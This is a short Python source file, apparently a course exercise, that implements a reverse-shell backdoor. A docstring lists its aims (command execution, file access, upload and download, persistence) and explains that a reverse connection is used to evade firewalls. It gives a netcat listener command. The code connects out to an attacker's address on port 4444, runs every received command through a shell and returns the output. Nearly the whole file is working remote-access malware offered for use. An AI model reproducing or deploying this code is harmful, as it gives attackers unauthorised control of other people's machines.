"""
A simple backdoor program.

Reverse backdoor:
    Listening for incoming connections on a specific port
    1. Access file system
    2. Execute system commands
    3. Download files
    4. Upload files
    5. Persistence
    
Backdoor:
    Interactive program gives access to system its executed on.
        1. Command execution
        2. Access file system
        3. Upload/Download files
        4. Run keylogger
        ...
 
Why do we use reverse connection:       
    1. Bind/Direct Connection is easy to be detected by the firewall 
    
Need to run following command in host machine to listen from incoming connection
    nc -vv -l -p 4444
"""
import socket
import subprocess
import json


class Backdoor:
    """
    Backdoor program.
    """

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # (ip of destination, port opened in target)
        self.connection.connect((ip, port))
        # send data
        self.reliable_send("\n[+] Connection established.\n")

    def reliable_send(self, data):
        """
        Convert data into json data and send it.
        Use this custom send method instead of socket send method.

        :param data: data that we want to send 
        :type data: obj
        """
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        Unwrap data into obj.
        Use this custom receive method instead of socket recv method.
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        """
        Execute a system command.
    
        :param command: command that we want to execute
        :type command: str
        :return: resulting command 
        :rtype: str
        """
        return subprocess.check_output(command, shell=True)

    def run(self):
        """
        Run the backdoor program.
        """
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()

            # execute command
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


if __name__ == "__main__":
    # TODO: set ip_address to local ip address
    ip_address = ""
    backdoor = Backdoor(ip_address, 4444)
    backdoor.run()
